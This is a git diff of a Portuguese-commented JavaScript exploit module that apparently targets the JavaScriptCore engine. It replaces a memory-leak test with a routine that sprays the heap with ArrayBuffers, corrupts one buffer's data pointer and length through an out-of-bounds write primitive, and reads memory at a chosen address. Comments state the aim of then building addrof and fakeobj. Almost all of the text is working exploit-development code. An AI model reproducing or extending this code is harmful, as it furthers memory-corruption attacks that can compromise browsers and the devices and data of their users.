@@ -1,31 +1,40 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs
+// js/script3/testMemoryLeakViaJsonTC.mjs (ATUALIZADO PARA CONSTRUIR LEITURA ARBITRÁRIA)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
-import { toHex } from '../utils.mjs';
+import { toHex, sleep } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_write_absolute,
     oob_read_absolute,
-    clearOOBEnvironment,
-    // Pré-requisitos para este exploit: addrof e fakeobj.
-    // Essas funções devem ser implementadas com base em outras vulnerabilidades
-    // ou construídas a partir da primitiva OOB. Por enquanto, são placeholders.
-    addrof,
-    fakeobj
+    clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-// --- Parâmetros de Teste para Vazamento de Memória ---
-const LEAK_TEST_CONFIG = {
-    // ArrayBuffer que será corrompido para se tornar nossa ferramenta de leitura.
-    master_ab_size: 256,
-    // Offsets relativos ao início do objeto ArrayBuffer na memória.
-    // Estes valores são específicos do motor JavaScript e da arquitetura.
-    // Eles precisam ser descobertos através de engenharia reversa ou experimentação.
-    // Exemplo para um JSC de 64 bits:
-    OFFSET_TO_BYTE_LENGTH: 8,  // Offset para o campo de tamanho (byteLength)
-    OFFSET_TO_BACKING_STORE: 16, // Offset para o ponteiro do buffer de dados
-    
-    // Objeto cujo endereço queremos vazar.
-    target_obj: { a: 0x41414141, b: 0x42424242 },
+// --- Configuração para Exploit de Leitura Arbitrária ---
+const ARBITRARY_READ_CONFIG = {
+    // Vamos "pulverizar" a memória com muitos ArrayBuffers para aumentar
+    // a chance de um deles estar em um local previsível.
+    SPRAY_COUNT: 200,
+    BUFFER_SIZE: 256,
+
+    // Endereço que vamos tentar ler. Idealmente, este seria o endereço de um objeto
+    // que queremos inspecionar, ou um endereço GOT/vtable para vazar um ponteiro de biblioteca.
+    // Como ainda não temos um 'addrof', vamos usar um endereço conhecido do disassembly.
+    // Ex: 0x00000000003BD820 (de JSC::ProtoCallFrame::argument)
+    TARGET_READ_ADDRESS: 0x3BD820n,
+
+    // Offsets para corromper os metadados do ArrayBuffer. Estes valores são
+    // específicos do motor e precisam ser ajustados.
+    OFFSET_TO_BYTE_LENGTH: 8,
+    OFFSET_TO_BACKING_STORE: 16,
+
+    // O script tentará corromper a memória em vários offsets relativos ao nosso
+    // buffer OOB, na esperança de atingir um dos buffers pulverizados.
+    corruption_offsets: [
+        (128) - 16, 
+        (128) - 8,
+        (128),
+        (128) + 8,
+        (128) + 16,
+    ],
 };
 // --- Fim dos Parâmetros ---
 
@@ -36,91 +45,84 @@ function readBigInt64(dataview, offset) {
     return (BigInt(high) << 32n) | BigInt(low);
 }
 
-export async function testMemoryLeakViaJsonTC() {
-    const FNAME = "testMemoryLeakViaJsonTC";
-    logS3(`--- Iniciando Teste de Vazamento de Endereço via Type Confusion (JSON-TC) ---`, "test", FNAME);
+export async function testArbitraryRead() {
+    const FNAME = "testArbitraryRead";
+    logS3(`--- Iniciando Tentativa de Leitura de Memória Arbitrária ---`, "test", FNAME);
+    logS3(`   Alvo da Leitura: ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)}`, "info", FNAME);
 
-    // Etapa 1: Configurar o ambiente para a primitiva de escrita Out-of-Bounds (OOB)
-    await triggerOOB_primitive();
-    if (!oob_write_absolute) {
-        logS3("Falha crítica ao configurar ambiente OOB. Abortando teste de leak.", "error", FNAME);
-        return;
-    }
+    let success = false;
 
-    // Etapa 2: Preparar os objetos para o ataque
-    logS3("Criando ArrayBuffer 'master' e objeto 'alvo'...", "info", FNAME);
-    let master_ab = new ArrayBuffer(LEAK_TEST_CONFIG.master_ab_size);
-    let target_obj = LEAK_TEST_CONFIG.target_obj;
+    // A cada tentativa, reconfiguramos o ambiente para isolar os efeitos.
+    for (const offset of ARBITRARY_READ_CONFIG.corruption_offsets) {
+        if (success) break;
 
-    // Etapa 3: Obter os endereços de memória necessários
-    // PRÉ-REQUISITO: Uma função 'addrof' que vaza o endereço de um objeto JS.
-    if (typeof addrof !== 'function') {
-         logS3("A primitiva 'addrof' não está disponível. Não é possível continuar com o vazamento de endereço.", "error", FNAME);
-         logS3("   -> Esta é uma etapa esperada no desenvolvimento de um exploit completo.", "info", FNAME);
-         clearOOBEnvironment();
-         return;
-    }
-
-    const master_ab_addr = addrof(master_ab);
-    const target_obj_addr = addrof(target_obj);
-
-    if (!master_ab_addr || !target_obj_addr) {
-        logS3("Falha ao obter o endereço do 'master_ab' ou 'target_obj'.", "error", FNAME);
-        clearOOBEnvironment();
-        return;
-    }
-    logS3(`Endereço de master_ab: ${toHex(master_ab_addr)}`, "info", FNAME);
-    logS3(`Endereço de target_obj: ${toHex(target_obj_addr)}`, "info", FNAME);
-
-    // Etapa 4: Corromper os metadados do 'master_ab' usando a primitiva OOB
-    // O objetivo é fazer com que o ponteiro de dados (backing store) do master_ab
-    // aponte para o nosso objeto alvo (target_obj).
-    const corruption_ptr_addr = master_ab_addr + BigInt(LEAK_TEST_CONFIG.OFFSET_TO_BACKING_STORE);
-    const corruption_len_addr = master_ab_addr + BigInt(LEAK_TEST_CONFIG.OFFSET_TO_BYTE_LENGTH);
-
-    logS3(`CORRUPÇÃO: Sobrescrevendo o ponteiro de dados do master_ab...`, "warn", FNAME);
-    logS3(`  -> Endereço do ponteiro a ser corrompido: ${toHex(corruption_ptr_addr)}`, "warn", FNAME);
-    logS3(`  -> Novo valor (endereço do alvo): ${toHex(target_obj_addr)}`, "warn", FNAME);
-    oob_write_absolute(corruption_ptr_addr, target_obj_addr, 8); // Escreve um ponteiro de 64 bits
-
-    logS3(`CORRUPÇÃO: Expandindo o tamanho (byteLength) do master_ab...`, "warn", FNAME);
-    logS3(`  -> Endereço do tamanho a ser corrompido: ${toHex(corruption_len_addr)}`, "warn", FNAME);
-    oob_write_absolute(corruption_len_addr, 0xFFFFFFFF, 4); // Escreve um tamanho grande de 32 bits
-
-    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para garantir que a corrupção seja efetivada
-
-    // Etapa 5: Ler a memória através do ArrayBuffer corrompido
-    logS3("Criando DataView sobre o 'master_ab' corrompido para ler a memória...", "info", FNAME);
-    
-    try {
-        // Agora, master_ab.byteLength é enorme e seu buffer aponta para target_obj.
-        // Uma DataView sobre ele nos permitirá ler a memória como se fosse um buffer de dados.
-        let memory_reader_view = new DataView(master_ab);
-
-        // Os primeiros bytes que lemos devem ser os metadados do nosso objeto alvo.
-        // O primeiro campo de um objeto JS é geralmente um ponteiro para sua StructureID.
-        const leaked_ptr_1 = readBigInt64(memory_reader_view, 0);
-        const leaked_ptr_2 = readBigInt64(memory_reader_view, 8);
-
-        logS3("--- VAZAMENTO DE MEMÓRIA BEM-SUCEDIDO! ---", "vuln", FNAME);
-        logS3(`Dados vazados do endereço ${toHex(target_obj_addr)}:`, "leak", FNAME);
-        logS3(`  [+0x00] 64 bits vazados: ${toHex(leaked_ptr_1)}`, "leak", FNAME);
-        logS3(`  [+0x08] 64 bits vazados: ${toHex(leaked_ptr_2)}`, "leak", FNAME);
-
-        // Verificação: O valor vazado se parece com um ponteiro de StructureID?
-        // Em muitos sistemas, os ponteiros não são "tagged", então a verificação é mais simples.
-        if ((leaked_ptr_1 & 0xFFFF000000000000n) !== 0n) {
-            logS3("VERIFICAÇÃO: O primeiro valor vazado parece ser um ponteiro válido (não é nulo ou pequeno).", "good", FNAME);
-        } else {
-            logS3("VERIFICAÇÃO: O primeiro valor vazado NÃO parece um ponteiro. A corrupção pode não ter funcionado como esperado.", "warn", FNAME);
+        await triggerOOB_primitive();
+        if (!oob_write_absolute) {
+            logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
+            return;
         }
 
-    } catch (e) {
-        logS3(`Falha ao ler a memória através do buffer corrompido: ${e.message}`, "error", FNAME);
-        logS3("   -> Isso pode indicar que a corrupção não foi bem-sucedida ou que o motor tem mitigações.", "info", FNAME);
-    } finally {
-        // Limpar o ambiente para evitar crashes em testes subsequentes
-        clearOOBEnvironment();
-        logS3(`--- Teste de Vazamento de Endereço Concluído ---`, "test", FNAME);
+        logS3(`\n>>> Nova Tentativa: Corrompendo offset relativo ${toHex(offset)}`, "info", FNAME);
+
+        // Etapa 1: Pulverizar o heap com ArrayBuffers para criar um layout previsível.
+        let sprayed_buffers = [];
+        for (let i = 0; i < ARBITRARY_READ_CONFIG.SPRAY_COUNT; i++) {
+            let ab = new ArrayBuffer(ARBITRARY_READ_CONFIG.BUFFER_SIZE);
+            // Preencher com um valor conhecido para identificar se a leitura foi alterada.
+            new Uint32Array(ab)[0] = 0xDEADBEEF;
+            sprayed_buffers.push(ab);
+        }
+        logS3(`${ARBITRARY_READ_CONFIG.SPRAY_COUNT} buffers pulverizados no heap.`, "info", FNAME);
+
+        try {
+            // Etapa 2: Usar a primitiva OOB para corromper um buffer que *esperamos* estar no offset.
+            // Vamos sobrescrever seu ponteiro de dados e seu tamanho.
+            
+            // Corrompe o ponteiro para o endereço que queremos ler
+            logS3(`  1. Escrevendo ponteiro para ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)} em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE}`, "warn", FNAME);
+            oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE, ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS, 8);
+
+            // Corrompe o tamanho para um valor grande
+            logS3(`  2. Escrevendo tamanho 0xFFFFFFFF em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH}`, "warn", FNAME);
+            oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH, 0xFFFFFFFF, 4);
+
+            await sleep(50); // Pausa curta
+
+            // Etapa 3: Verificar todos os buffers pulverizados para encontrar o que foi corrompido.
+            for (let i = 0; i < sprayed_buffers.length; i++) {
+                const ab = sprayed_buffers[i];
+                // Se o tamanho foi corrompido, será diferente do original.
+                if (ab.byteLength > ARBITRARY_READ_CONFIG.BUFFER_SIZE) {
+                    logS3(`--- SUCESSO: Buffer [${i}] foi corrompido! ---`, "vuln", FNAME);
+                    logS3(`   Tamanho original: ${ARBITRARY_READ_CONFIG.BUFFER_SIZE}, Tamanho corrompido: ${ab.byteLength}`, "info", FNAME);
+                    
+                    // Agora usamos este buffer para ler o endereço alvo.
+                    let memory_reader_view = new DataView(ab);
+                    const leaked_data = readBigInt64(memory_reader_view, 0);
+
+                    logS3(`   >> DADO VAZADO de ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)}: ${toHex(leaked_data)}`, "leak", FNAME);
+
+                    // A partir daqui, você teria uma primitiva de leitura arbitrária.
+                    // Poderíamos usá-la para construir 'addrof' e 'fakeobj'.
+                    success = true;
+                    break; 
+                }
+            }
+
+        } catch (e) {
+            logS3(`Erro durante a tentativa com offset ${toHex(offset)}: ${e.message}`, "error", FNAME);
+        }
+        
+        // Limpa a memória para a próxima tentativa
+        sprayed_buffers = null;
+        globalThis.gc?.(); // Sugere ao motor para fazer a coleta de lixo, se disponível/exposto.
+        await sleep(50);
+    }
+
+    clearOOBEnvironment();
+    if (success) {
+        logS3("--- Primitiva de LEITURA ARBITRÁRIA construída com sucesso! ---", "vuln", FNAME);
+    } else {
+        logS3("--- Teste concluído, não foi possível encontrar um offset vulnerável. ---", "warn", FNAME);
     }
 }
